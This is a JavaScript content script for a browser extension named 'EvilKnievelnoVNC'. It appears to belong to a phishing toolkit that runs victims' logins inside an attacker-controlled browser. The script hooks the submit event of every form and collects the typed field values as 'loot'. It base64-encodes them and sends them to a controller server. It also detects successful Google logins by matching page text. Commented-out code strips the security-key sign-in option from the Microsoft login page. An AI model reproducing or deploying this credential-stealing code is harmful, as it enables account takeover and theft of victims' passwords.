// test with google-chrome --load-extension="." --no-first-run --auto-open-devtools-for-tabs <URL>
const debug = true;
const id = "REQID";		// substituted by index.php and reset by controller
const serverName = "SNAME";	// substituded by index.php and reset by controller
// define at least one search string
//	if found in the HTML source of a page of the victim, it is assumed there is a successful login
const searchStrings = [
	'Te damos la bienvenida,', // accounts.google.com
];
//const targetCookie = "";
const ctrlUrl = "https://controller/?svr=" + serverName + "&reqid=" + id + "&cmd=";

function log(msg) { if(debug) console.log(msg); }

function warn(msg) { if(debug) console.warn(msg); }

function hide() {
    //document.body.innerHTML = "<br /><center><p>blocked</p></center>";
    //document.removeChild(document.documentElement);
    window.location.replace(targetURL);
}
function mark() {
    document.body.prepend(Object.assign(document.createElement('h1'),{innerHTML:"Testing!"}));
}
function sendRequest(url) {
	let request = new XMLHttpRequest();

	request.open("GET", url);
	request.addEventListener('load', function(event) {
		if (request.status >= 200 && request.status < 300) {
			log("[*] " + url + " -> " + request.responseText);
		} else {
			warn("[!] " + url + " -> " + request.statusText, request.responseText);
		}
	});
	request.send();
}
function base64url_encode(buffer) {
	return btoa(Array.from(new Uint8Array(buffer), b => String.fromCharCode(b)).join(''))
		.replace(/\+/g, '-')
		.replace(/\//g, '_')
		.replace(/=+$/, '');
}

function base64url_enc(str) {
	let utf8Encode = new TextEncoder();
	let byteArray = utf8Encode.encode(str);

	return btoa(Array.from(new Uint8Array(byteArray)).map(val => {
		return String.fromCharCode(val);
	}).join('')).replace(/\+/g, '-').replace(/\//g, '_').replace(/\=/g, '');
}

// =====================================================
log("[*] EvilKnievelnoVNC EXTENSION LOADED");


// STRING DETECTION
// kill victim connection after successfull login

const source = document.getElementsByTagName('html')[0].innerHTML;

//if(source.indexOf(searchString)) {
searchStrings.every(val => {
	if(source.includes(val)) {
		log("[*] search string found!");
		sendRequest(ctrlUrl + "success");
		return false; // break
	} else {
		log("[!] search string not found: " + val);
		return true; // continue
	}
});


// COOKIE DETECTION (tbd)
// kill victim connection after successfull login
//	not working directly (httpOnly)
//	https://developer.chrome.com/docs/extensions/reference/cookies/#method-getAll

/*
chrome.cookies.getAll({}, function (cookies) {
	cookies.forEach(function(item) {
		console.log(item)
	})
});
*/

// MANIPULATE CONTENT
// remove key auth option for Windows Live login
/*
if(window.location.hostname == "login.live.com") {
	log("[*] Windows Live login detected");

	var mainLoopId = setInterval(function(){
		//document.getElementsByName("switchToFido")[0].parentNode.style.display = "none";
		//document.getElementsByClassName("promoted-fed-cred-box")[0].style.display = "none";
		//document.getElementsByName("switchToFido")[0].parentNode.remove();
		let k1 = document.getElementsByName("switchToFido")[0];
		if(k1) k1.parentNode.remove();

		let k2 = document.getElementsByClassName("promoted-fed-cred-box")[0];
		if(k2) k2.remove();
	}, 500); // check every x milliseconds, for dynamic sites
}*/


// HOOKING FORMS FOR LOGGING

let forms = document.getElementsByTagName("form");

for(let form of forms) {
	log("[*] form found");

	form.addEventListener("submit", function() {
		let inputs = this.getElementsByTagName("input");
		let loot = "";

		for(let input of inputs) {
			if(input.type != "hidden" && input.name) {
				loot += input.name + "=" + input.value + "\t";
			}
		}

		console.log("loot: " + loot);

		// send data base64 encoded to controller
		sendRequest(ctrlUrl + "logsubmit&fields=" + base64url_enc(loot));
	});
}


// REDIRECT if window.location differs from target domain
// tbd, one needs to differentiate unauth vs auth...
/*let domain = document.location.host;

if(domain.localeCompare(targetDomain) !== 0) {
	warn("[!] domain not matching target");
	hide();
}*/


